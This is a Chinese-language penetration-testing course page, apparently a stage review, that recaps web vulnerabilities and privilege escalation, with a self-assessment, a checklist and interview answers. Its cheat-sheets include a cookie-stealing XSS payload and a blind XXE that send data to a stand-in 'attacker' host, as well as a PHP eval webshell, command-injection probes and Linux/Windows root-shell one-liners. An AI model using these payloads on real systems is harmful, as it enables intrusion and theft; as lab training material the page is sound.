---
title: Day059：第二阶段复盘 - 攻坚技能知识整合
tags:
  - 网络安全
  - 阶段复盘
  - 知识整合
  - Web漏洞
  - 系统提权
categories:
  - 90天安全突击
stage: 攻坚
abbrlink: d059
date: 2026-03-22
updated: 2026-01-28
---

# Day059：第二阶段复盘 - 攻坚技能知识整合

## 基本信息

| 项目 | 内容 |
|------|------|
| **所属阶段** | 攻坚（第二阶段） |
| **所属周次** | Week 10：第二阶段收官 |
| **今日主题** | 阶段复盘与知识整合 |
| **预计时间** | 4-5 小时 |
| **难度等级** | 综合 |

---

## 今日痛点场景

> **场景**：30 天攻坚阶段即将结束，你学了 SQL 注入、XSS、文件上传、命令注入、SSRF、XXE、反序列化、Linux 提权、Windows 提权、内核漏洞……知识点太多太杂，感觉都会一点但都不精。
>
> **问题**：如何把零散的知识串成体系？如何确保真正掌握而不是"看过就忘"？
>
> **今天的任务**：进行系统性复盘，把攻坚阶段的知识整合成完整的攻击链路。

---

## 今日目标

- [ ] 完成第二阶段知识图谱
- [ ] 输出个人技能评估
- [ ] 形成攻击链路思维导图
- [ ] 准备明日综合考核

**闯关条件**：输出完整的第二阶段学习总结文档。

---

## 第二阶段知识回顾

### 阶段概览

```
第二阶段：攻坚（Day 31 - Day 60）
├── Week 6：Web 基础漏洞
│   ├── SQL 注入全系列
│   ├── XSS（存储/反射/DOM）
│   └── 文件上传漏洞
│
├── Week 7：Web 高级漏洞
│   ├── 命令注入
│   ├── SSRF
│   ├── XXE
│   └── 反序列化漏洞
│
├── Week 8：Web 进阶漏洞
│   ├── CSRF
│   ├── IDOR
│   ├── JWT 安全
│   ├── 逻辑漏洞
│   └── WebSocket/GraphQL
│
├── Week 9：系统提权
│   ├── Linux 提权（SUID/Sudo/Cron）
│   ├── Windows 提权（服务/令牌）
│   └── 内核漏洞利用
│
└── Week 10：收官
    ├── Day059：知识整合（今天）
    └── Day060：综合考核
```

### Week 6 核心知识

**SQL 注入**：
```
类型：
├── 联合注入（UNION）
├── 报错注入（extractvalue/updatexml）
├── 布尔盲注
├── 时间盲注
└── 堆叠注入

关键命令：
' OR 1=1--
' UNION SELECT 1,2,3--
' AND (SELECT extractvalue(1,concat(0x7e,version())))--
' AND IF(1=1,SLEEP(5),0)--

工具：sqlmap
sqlmap -u "url" --dbs --batch

绕过：大小写、双写、编码、内联注释
```

**XSS**：
```
类型：
├── 存储型（最危险）
├── 反射型
└── DOM 型

Payload：
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
javascript:alert(1)

Cookie 窃取：
<script>new Image().src="http://attacker/steal?c="+document.cookie</script>

绕过：编码、事件处理、标签闭合
```

**文件上传**：
```
绕过方法：
├── 前端验证 → 抓包修改
├── Content-Type → 修改 MIME
├── 黑名单 → 特殊后缀（phtml/php5）
├── 白名单 → 00 截断/双写
├── 内容检测 → 图片马
└── 二次渲染 → 特殊构造

Webshell：
<?php @eval($_POST['cmd']);?>

蚁剑/哥斯拉连接
```

### Week 7 核心知识

**命令注入**：
```
测试 Payload：
; id
| id
|| id
& id
&& id
$(id)
`id`

盲注检测：
; sleep 5
; ping -c 3 attacker.com

绕过空格：
${IFS}、$IFS$9、{cat,/etc/passwd}、<、>

绕过关键字：
cat → c'a't、c\at、/bin/c?t
```

**SSRF**：
```
测试 Payload：
http://127.0.0.1
http://localhost
http://[::1]

协议利用：
file:///etc/passwd
dict://127.0.0.1:6379/info
gopher://127.0.0.1:6379/_*1%0d%0a...

绕过：
短链接、DNS 重绑定、302 跳转、进制转换
```

**XXE**：
```
经典 Payload：
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

Blind XXE（外带）：
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://attacker/?data=%file;'>">
%eval;
%exfil;
```

**反序列化**：
```
PHP：
O:8:"ClassName":1:{s:4:"prop";s:5:"value";}
利用 __wakeup()、__destruct() 等魔术方法

Java：
ysoserial 生成 payload
java -jar ysoserial.jar CommonsCollections1 "cmd"

Python pickle：
import pickle
class Exploit:
    def __reduce__(self):
        return (os.system, ('id',))
```

### Week 8 核心知识

**CSRF**：
```
攻击条件：
1. 目标有敏感操作
2. 无有效 Token 验证
3. Cookie 自动携带

Payload：
<form action="target" method="POST">
  <input name="param" value="value">
</form>
<script>document.forms[0].submit();</script>
```

**IDOR**：
```
测试方法：
/api/user/123 → /api/user/124
?id=1 → ?id=2
Base64 解码后修改

防御绕过：
GUID 可预测、参数关联
```

**JWT 安全**：
```
攻击方式：
1. alg: none 攻击
2. 弱密钥爆破
3. 算法混淆（RS256→HS256）
4. 密钥泄露

工具：
jwt_tool.py
hashcat -m 16500 jwt.txt wordlist.txt
```

**逻辑漏洞**：
```
常见类型：
├── 越权（水平/垂直）
├── 支付逻辑（金额篡改、重放）
├── 验证码（绕过、复用）
├── 密码重置（任意重置）
└── 竞态条件（并发请求）
```

### Week 9 核心知识

**Linux 提权**：
```
信息收集：
uname -a && id && whoami
cat /etc/*release
sudo -l

SUID 提权：
find / -perm -4000 2>/dev/null
find . -exec /bin/sh -p \; -quit
sudo vim -c ':!/bin/sh'

Capabilities：
getcap -r / 2>/dev/null
python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'

Cron 任务：
cat /etc/crontab
PATH 劫持、通配符注入

工具：LinPEAS、pspy
```

**Windows 提权**：
```
信息收集：
whoami /all
systeminfo
wmic service get name,pathname

服务提权：
未引用路径、可写服务文件

令牌模拟（SeImpersonatePrivilege）：
PrintSpoofer.exe -i -c cmd
GodPotato.exe -cmd "whoami"

AlwaysInstallElevated：
msiexec /quiet /qn /i shell.msi

工具：WinPEAS、PowerUp
```

**内核漏洞**：
```
Linux：
Dirty COW (CVE-2016-5195)
Dirty Pipe (CVE-2022-0847)
PwnKit (CVE-2021-4034)

Windows：
MS15-051, MS16-032
EternalBlue (MS17-010)
Print Nightmare (CVE-2021-1675)

工具：linux-exploit-suggester、windows-exploit-suggester
```

---

## 攻击链路整合

### 完整渗透流程

```
信息收集
    ↓
Web 漏洞发现
    ↓
漏洞利用获取 Shell
    ↓
权限提升
    ↓
后渗透/横向移动
    ↓
目标达成
```

### 从 Web 漏洞到 Shell

```
入口点选择：
├── SQL 注入 → 读写文件 → Webshell
├── 文件上传 → 直接上传 Webshell
├── 命令注入 → 直接执行反弹 shell
├── SSRF → 攻击内部服务 → RCE
├── XXE → 读取敏感文件 → 获取凭据
└── 反序列化 → 直接 RCE

Shell 类型：
1. Webshell（持久但易被检测）
2. 反弹 shell（主动连接攻击者）
3. Bind shell（监听端口等待连接）
```

### 从 Shell 到 Root/SYSTEM

```
低权限 Shell
      ↓
  信息收集
      ↓
┌─────┴─────┐
│           │
Linux     Windows
│           │
↓           ↓

Linux 路径：
1. sudo -l → 可 sudo 命令？
2. SUID → find/vim/python？
3. Capabilities → CAP_SETUID？
4. Cron → 可写脚本？
5. 内核 → 已知漏洞？

Windows 路径：
1. whoami /priv → SeImpersonate？
2. 服务 → 未引用路径？
3. 注册表 → AlwaysInstallElevated？
4. 凭据 → 明文密码？
5. 内核 → 未打补丁？
```

---

## 个人技能评估

### 自评表

请根据自己的实际掌握程度打分（1-5分）：

| 技能领域 | 技能点 | 自评分数 | 需要加强 |
|----------|--------|----------|----------|
| **SQL 注入** | 联合注入 | /5 | |
| | 盲注（布尔/时间） | /5 | |
| | WAF 绕过 | /5 | |
| | sqlmap 使用 | /5 | |
| **XSS** | 存储型利用 | /5 | |
| | 绕过技术 | /5 | |
| | Cookie 窃取 | /5 | |
| **文件上传** | 绕过技术 | /5 | |
| | Webshell 使用 | /5 | |
| **命令注入** | 检测与利用 | /5 | |
| | 绕过技术 | /5 | |
| **SSRF** | 协议利用 | /5 | |
| | 绕过技术 | /5 | |
| **XXE** | 基础利用 | /5 | |
| | Blind XXE | /5 | |
| **反序列化** | PHP | /5 | |
| | Java | /5 | |
| **Linux 提权** | SUID | /5 | |
| | Sudo | /5 | |
| | Cron | /5 | |
| | Capabilities | /5 | |
| **Windows 提权** | 服务 | /5 | |
| | 令牌模拟 | /5 | |
| **内核漏洞** | 利用流程 | /5 | |

**总分**：____/125

**评级**：
- 100-125：攻坚高手
- 75-99：稳步前进
- 50-74：需要加强
- 50 以下：重点补课

### 薄弱环节识别

根据自评，列出需要重点加强的 3-5 个技能点：

```
1. ________________
2. ________________
3. ________________
4. ________________
5. ________________
```

---

## 实战任务

### 任务 1：知识图谱绘制（60 分钟）

**要求**：使用思维导图工具绘制第二阶段完整知识图谱

**工具选择**：
- XMind
- MindMaster
- draw.io
- 手绘（拍照）

**必须包含**：
1. 所有漏洞类型
2. 每种漏洞的关键 Payload
3. 对应的防御方法
4. 漏洞之间的关联

**记录**：
```
使用的工具：________________
知识图谱文件位置：________________
```

---

### 任务 2：攻击链路演练（60 分钟）

**要求**：完成一次从 Web 漏洞到提权的完整流程

**推荐靶机**：
- VulnHub: Kioptrix 系列
- TryHackMe: Buffer Overflow Prep / Windows PrivEsc
- HackTheBox: 任意 Easy 靶机

**流程记录**：
```
靶机名称：________________

1. 信息收集阶段：
   - 发现的服务：________________
   - 发现的漏洞：________________

2. 漏洞利用阶段：
   - 利用的漏洞：________________
   - 获取的权限：________________

3. 提权阶段：
   - 使用的方法：________________
   - 最终权限：________________

4. 总耗时：________________
```

---

### 任务 3：Checklist 整理（30 分钟）

**要求**：形成个人渗透测试 Checklist

**Web 漏洞 Checklist**：
```
□ SQL 注入测试（单引号、双引号、时间延迟）
□ XSS 测试（基础标签、事件处理、编码）
□ 文件上传测试（后缀、Content-Type、内容）
□ 命令注入测试（管道符、反引号）
□ SSRF 测试（协议、内网地址）
□ XXE 测试（实体引用、外部实体）
□ 反序列化测试（参数格式、已知链）
□ CSRF 测试（Token、Referer）
□ IDOR 测试（ID 遍历、越权）
□ JWT 测试（算法、密钥）
```

**提权 Checklist**：
```
Linux：
□ 基本信息（uname/id/whoami）
□ sudo -l
□ SUID/SGID 文件
□ Capabilities
□ Cron 任务
□ 敏感文件
□ 内核版本

Windows：
□ 基本信息（systeminfo/whoami）
□ 令牌权限
□ 服务配置
□ 注册表设置
□ 凭据搜索
□ 补丁级别
```

---

## 面试问答准备

### 高频面试题

**Q1：描述一次完整的 Web 渗透流程？**

A1：
```
1. 信息收集
   - 子域名、端口、目录扫描
   - 技术栈识别

2. 漏洞发现
   - 手工测试（注入、XSS 等）
   - 工具扫描（Burp、AWVS）

3. 漏洞利用
   - 获取初始访问（Webshell/反弹shell）

4. 权限提升
   - Linux：SUID/Sudo/Cron/内核
   - Windows：服务/令牌/内核

5. 后渗透
   - 信息收集、凭据获取
   - 横向移动

6. 报告输出
   - 漏洞描述、复现步骤、修复建议
```

**Q2：SQL 注入和命令注入的区别？**

A2：
```
SQL 注入：
- 目标：数据库
- 影响：数据泄露、篡改、删除
- Payload：' OR 1=1--、UNION SELECT
- 防御：预编译语句、参数化查询

命令注入：
- 目标：操作系统
- 影响：直接执行系统命令
- Payload：; id、| cat /etc/passwd
- 防御：避免拼接命令、白名单过滤
```

**Q3：SSRF 能做什么？**

A3：
```
1. 探测内网
   - 端口扫描
   - 服务识别

2. 读取文件
   - file:// 协议

3. 攻击内部服务
   - Redis 未授权
   - 云元数据服务

4. 绕过 IP 限制
   - 访问本地服务

5. 作为跳板
   - 进一步渗透内网
```

**Q4：Linux 和 Windows 提权的主要区别？**

A4：
```
Linux：
- 核心概念：UID/GID、SUID/SGID、Capabilities
- 主要向量：sudo、SUID、Cron、内核
- 目标：获取 root (UID 0)
- 特点：配置相对简单，权限模型清晰

Windows：
- 核心概念：Token、SID、Privileges
- 主要向量：服务、令牌权限、注册表、内核
- 目标：获取 SYSTEM 或 Administrator
- 特点：权限模型复杂，需要理解 Token 机制
```

---

## 今日闯关检查

| 检查项 | 分数 |
|--------|------|
| 知识图谱绘制完成 | 25 分 |
| 个人技能评估完成 | 20 分 |
| 攻击链路演练完成 | 30 分 |
| 个人 Checklist 整理 | 15 分 |
| 面试问答准备 | 10 分 |

**60 分及格，80 分优秀，100 分满分**

你的得分：____

---

## 明日预告

**Day 060：第二阶段综合考核**

明天你将：
- 完成综合 CTF 挑战
- 进行模拟面试
- 输出第二阶段学习总结
- 获得第二阶段结业评价

**考核内容**：
1. 技术实操（靶机挑战）
2. 理论问答（面试模拟）
3. 文档输出（报告撰写）

---

## 学习记录

| 项目 | 内容 |
|------|------|
| 实际学习日期 | |
| 知识图谱完成情况 | |
| 技能自评总分 | |
| 最大薄弱点 | |
| 今日收获 | |

---

> **导师点评**：
>
> 30 天攻坚阶段，你从 Web 漏洞一路学到系统提权，这是一个巨大的跨越。
>
> 但知识的价值不在于"学过"，而在于"能用"。今天的复盘就是把零散的知识点串成一条攻击链——从发现漏洞，到获取 shell，到提权，每一步都要做到心中有数。
>
> 明天的综合考核会真正检验你的学习成果。不是看你记住了多少命令，而是看你面对一台陌生的机器，能不能独立完成渗透。
>
> **真正的高手不是记住了所有答案，而是面对未知问题知道从哪里开始**。
>
> 好好准备，明天见！

```bash
echo "Day 059 Complete! 知识整合完成！"
echo "准备迎接第二阶段综合考核..."
```
